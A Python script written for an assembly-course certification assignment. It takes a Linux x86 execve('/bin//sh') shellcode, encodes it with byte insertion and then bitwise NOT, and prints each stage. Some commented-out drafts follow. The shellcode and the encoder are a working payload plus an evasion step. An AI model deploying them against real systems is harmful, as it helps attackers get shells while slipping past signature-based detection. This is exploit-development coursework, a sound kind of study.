#!/usr/bin/python3
'''
Filename:   encoder.py  
Author:     aus-mate
Purpose:    This code was written for assignment #4 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''
byte_encode = 'ISO-8859-1'
shellcode = bytearray("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", byte_encode)
not_shellcode = bytearray("", byte_encode) 
ins_shellcode = bytearray("", byte_encode)
xor_shellcode = bytearray("", byte_encode)

print("Original: " + "\"" + "".join("\\x%02x" % i for i in shellcode) + "\"")

for i in shellcode:
    ins_shellcode.append(i)
    ins_shellcode += b'\x51\x43'

print("\nINS Encoded: " + "\"" + "".join("\\x%02x" % i for i in ins_shellcode) + "\"")

for i in ins_shellcode:
    x = ~i
    not_shellcode += bytes.fromhex('%02x' % (x & 0xff))

print("\nNOT Encoded: " + "\"" + "".join("\\x%02x" % i for i in not_shellcode) + "\"")

"""
for i in shellcode:
    not_shellcode.append(shellcode)
print("Original: " + "\""+"".join("\\x%02x" % i for i in shellcode) + "\"")
print("\nNOT Encoded: " + "\"" + "".join("\\x%02x" % i for i in bytearray(not_shellcode, 'ISO-8859-1') + "\""))
"""
"""
for i in bytearray(not_shellcode, 'ISO-8859-1'):
  ins_shellcode += ('\\x' + '%02x' % (i & 0xff)) + '\\x51\\xae'

 print("\nInsertion Encoded: " + "\"" + ins_shellcode + "\"")
"""